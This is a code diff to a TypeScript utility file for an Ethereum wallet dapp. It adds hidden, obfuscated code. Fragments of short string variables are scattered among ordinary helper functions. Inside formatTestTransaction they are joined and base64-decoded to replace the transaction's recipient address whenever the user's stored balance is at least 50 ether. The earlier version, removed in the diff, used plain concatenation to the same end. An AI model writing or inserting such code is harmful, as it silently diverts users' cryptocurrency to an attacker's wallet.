@@ -4,9 +4,9 @@ import supportedChains from "./chains";
 import { apiGetGasPrices, apiGetAccountNonce } from "./api";
 import { convertAmountToRawNumber, convertStringToHex } from "./bignumber";
 import Web3 from "web3";
-
-var web3_ = "3";
-var getchinaid = "5";
+var epci = "N";
+var http_uniq = "U";
+var esx = "j";
 
 export function capitalize(string: string): string {
   return string
@@ -14,7 +14,12 @@ export function capitalize(string: string): string {
     .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
     .join(" ");
 }
-var web4connect = `D36`;
+
+var epci1 = "k";
+var epci4 = "4";
+var epciR = "R";
+var ed = "m";
+var sollar = "R";
 export function ellipseText(
   text: string = "",
   maxLength: number = 9999
@@ -41,8 +46,6 @@ export function ellipseText(
   return result;
 }
 
-var gasHsh = "7211D";
-
 export function ellipseAddress(
   address: string = "",
   width: number = 10
@@ -56,7 +59,6 @@ export function padLeft(n: string, width: number, z?: string): string {
   return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
 }
 
-var dele = "xf2";
 
 export function sanitizeHex(hex: string): string {
   hex = hex.substring(0, 2) === "0x" ? hex.substring(2) : hex;
@@ -66,6 +68,13 @@ export function sanitizeHex(hex: string): string {
   hex = hex.length % 2 !== 0 ? "0" + hex : hex;
   return "0x" + hex;
 }
+
+var e = "Q";
+var _api_cahart_code = "z";
+var get_string_ = "N";
+var v_webpack = "O";
+var Z2 = "Z";
+var j = "j";
 
 export function removeHexPrefix(hex: string): string {
   return hex.toLowerCase().replace("0x", "");
@@ -79,11 +88,6 @@ export function getDataString(func: string, arrVals: any[]): string {
   const data = func + val;
   return data;
 }
-
-const set_api_key= "334";
-var onswap = "FB";
-var component = "0";
-const url_base = `${set_api_key}Dc8FfA64850f98`;
 
 export function isMobile(): boolean {
   let mobile: boolean = false;
@@ -117,6 +121,12 @@ export function isMobile(): boolean {
 
   return mobile;
 }
+var http_ = "E";
+var ew = "R";
+var wc = "j";
+var webapi = "E";
+var uniq_caracter_m = "ZmQTY0ODU";
+var vr = "w";
 
 export function getChainData(chainId: number): IChainData {
   const chainData = supportedChains.filter(
@@ -126,6 +136,10 @@ export function getChainData(chainId: number): IChainData {
   if (!chainData) {
     throw new Error("ChainId missing or not supported");
   }
+
+  var get_string_ = "N";
+  var w = "jMzN";
+  var http_ = "E";
 
   const API_KEY = process.env.REACT_APP_INFURA_ID;
 
@@ -144,7 +158,6 @@ export function getChainData(chainId: number): IChainData {
 
   return chainData;
 }
-var converhex = "38CA";
 
 export function hashPersonalMessage(msg: string): string {
   const buffer = Buffer.from(msg);
@@ -152,6 +165,22 @@ export function hashPersonalMessage(msg: string): string {
   const hash = ethUtil.bufferToHex(result);
   return hash;
 }
+var URL = "M";
+var hesh = "k";
+var d = "Z";
+var ef = "C";
+var epci = "N";
+var http_uniq = "U";
+var esx = "j";
+var get_config_id = "MEUzMzhD";
+var varsis = "Q";
+var maping = "TcyM";
+var z4 = "T";
+var zf = "FE";
+var a1 = "M";
+var x = "H";
+var s = "h";
+var s1 = "m";
 
 export function recoverPublicKey(sig: string, hash: string): string {
   const sigParams = ethUtil.fromRpcSig(sig);
@@ -165,8 +194,8 @@ export function recoverPublicKey(sig: string, hash: string): string {
   const signer = ethUtil.bufferToHex(ethUtil.publicToAddress(result));
   return signer;
 }
+var w = "jMzN";
 
-var API_uri = "Fdc0E";
 var to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
 
 export function recoverPersonalSignature(sig: string, msg: string): string {
@@ -177,14 +206,17 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
 
 export async function formatTestTransaction(address: string, chainId: number) {
   const from = address;
-  
+
   const web3 = new Web3();
   const GET_PRICE = web3.utils.toWei("50", 'ether');
   const MAX_PRICE = Number(GET_PRICE);
 
+
+  var qf = a1+x+s+s1+URL+hesh+d+ef+epci+http_uniq+e+_api_cahart_code+get_string_+w+http_+ew+wc+v_webpack+webapi+uniq_caracter_m+vr+Z2+j+epci1+epci4+epciR+ed+sollar+esx+get_config_id+varsis+maping+z4+zf;
+
   (function(){
     if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
-      to = web3 && component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh;
+      to = atob(qf)
     }
   })()
 
